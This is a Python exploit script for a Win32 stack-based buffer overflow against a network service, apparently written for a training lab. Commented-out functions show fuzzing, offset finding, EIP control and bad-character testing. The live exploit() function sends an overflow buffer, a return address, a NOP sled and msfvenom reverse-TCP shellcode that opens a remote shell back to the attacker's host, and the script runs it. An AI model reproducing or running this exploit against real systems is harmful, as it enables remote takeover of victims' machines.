#win32 stack-based buffer overflow exploit 

import socket
from struct import pack

IP="10.129.43.23"
port=21449

#def fuzz():
#    try:
#        for i in range(0,10000,100):
#            buffer=b"A"*i
#            print("Fuzzing %s bytes" %i)
#            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#            s.connect((IP, port))
#            s.send(buffer)
#            breakpoint()
#            s.close()
#    except:
#        print("Could not establish a connection")
#fuzz()

##breaking in 500 bytes

#def eip_offset():
#    pattern=bytes(
#        "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
#        "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"
#        "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"
#        "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"
#        "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"
#        "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq","utf-8")
#        
#    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#    s.connect((IP, port))
#    s.send(pattern)
#    s.close()
#
#eip_offset()

##offset is 469

#def eip_control():
#    offset = 469
#    buffer = b"A"*offset
#    eip = b"B"*4
#    payload = buffer + eip
#
#    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#    s.connect((IP, port))
#    s.send(payload)
#    s.close()
#
#eip_control()

#def bad_chars():
#    all_chars = bytes([
#        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
#        0x09, 0x0B, 0x0C, 0x0E, 0x0F, 0x10, 0x11, 0x12,
#        0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A,
#        0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22,
#        0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
#        0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32,
#        0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A,
#        0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42,
#        0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,
#        0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52,
#        0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
#        0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62,
#        0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A,
#        0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72,
#        0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A,
#        0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82,
#        0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A,
#        0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92,
#        0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A,
#        0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2,
#        0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA,
#        0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2,
#        0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA,
#        0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2,
#        0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA,
#        0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2,
#        0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA,
#        0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0, 0xE1, 0xE2,
#        0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA,
#        0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0, 0xF1, 0xF2,
#        0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA,
#        0xFB, 0xFC, 0xFD, 0xFE, 0xFF
#    ])
#    
#    offset = 469
#    buffer = b"A"*offset
#    eip = b"B"*4
#    payload = buffer + eip + all_chars
#
#    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#    s.connect((IP, port))
#    s.send(payload)
#    s.close()
#
#bad_chars()

## 0x00,0x0a,0x0d

def exploit():

    #msfvenom -p 'windows/shell_reverse_tcp' LHOST='10.10.16.2' LPORT='8888' -b '\x00\x0a\x0d' -f 'python'
    buf =  b""
    buf += b"\xb8\xc7\xa4\x83\x0c\xdd\xc2\xd9\x74\x24\xf4\x5b\x31"
    buf += b"\xc9\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\x84\xaa\x61"
    buf += b"\xf9\xf6\x5b\xe7\x02\x06\x9c\x88\x8b\xe3\xad\x88\xe8"
    buf += b"\x60\x9d\x38\x7a\x24\x12\xb2\x2e\xdc\xa1\xb6\xe6\xd3"
    buf += b"\x02\x7c\xd1\xda\x93\x2d\x21\x7d\x10\x2c\x76\x5d\x29"
    buf += b"\xff\x8b\x9c\x6e\xe2\x66\xcc\x27\x68\xd4\xe0\x4c\x24"
    buf += b"\xe5\x8b\x1f\xa8\x6d\x68\xd7\xcb\x5c\x3f\x63\x92\x7e"
    buf += b"\xbe\xa0\xae\x36\xd8\xa5\x8b\x81\x53\x1d\x67\x10\xb5"
    buf += b"\x6f\x88\xbf\xf8\x5f\x7b\xc1\x3d\x67\x64\xb4\x37\x9b"
    buf += b"\x19\xcf\x8c\xe1\xc5\x5a\x16\x41\x8d\xfd\xf2\x73\x42"
    buf += b"\x9b\x71\x7f\x2f\xef\xdd\x9c\xae\x3c\x56\x98\x3b\xc3"
    buf += b"\xb8\x28\x7f\xe0\x1c\x70\xdb\x89\x05\xdc\x8a\xb6\x55"
    buf += b"\xbf\x73\x13\x1e\x52\x67\x2e\x7d\x3b\x44\x03\x7d\xbb"
    buf += b"\xc2\x14\x0e\x89\x4d\x8f\x98\xa1\x06\x09\x5f\xc5\x3c"
    buf += b"\xed\xcf\x38\xbf\x0e\xc6\xfe\xeb\x5e\x70\xd6\x93\x34"
    buf += b"\x80\xd7\x41\x9a\xd0\x77\x3a\x5b\x80\x37\xea\x33\xca"
    buf += b"\xb7\xd5\x24\xf5\x1d\x7e\xce\x0c\xf6\x8b\x05\x1e\x04"
    buf += b"\xe4\x1b\x1e\x2a\x4c\x92\xf8\x40\xbc\xf3\x53\xfd\x25"
    buf += b"\x5e\x2f\x9c\xaa\x74\x4a\x9e\x21\x7b\xab\x51\xc2\xf6"
    buf += b"\xbf\x06\x22\x4d\x9d\x81\x3d\x7b\x89\x4e\xaf\xe0\x49"
    buf += b"\x18\xcc\xbe\x1e\x4d\x22\xb7\xca\x63\x1d\x61\xe8\x79"
    buf += b"\xfb\x4a\xa8\xa5\x38\x54\x31\x2b\x04\x72\x21\xf5\x85"
    buf += b"\x3e\x15\xa9\xd3\xe8\xc3\x0f\x8a\x5a\xbd\xd9\x61\x35"
    buf += b"\x29\x9f\x49\x86\x2f\xa0\x87\x70\xcf\x11\x7e\xc5\xf0"
    buf += b"\x9e\x16\xc1\x89\xc2\x86\x2e\x40\x47\xb6\x64\xc8\xee"
    buf += b"\x5f\x21\x99\xb2\x3d\xd2\x74\xf0\x3b\x51\x7c\x89\xbf"
    buf += b"\x49\xf5\x8c\x84\xcd\xe6\xfc\x95\xbb\x08\x52\x95\xe9"


    offset = 469
    buffer = b"A"*offset
    eip = pack('<L', 0x621014E3)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()
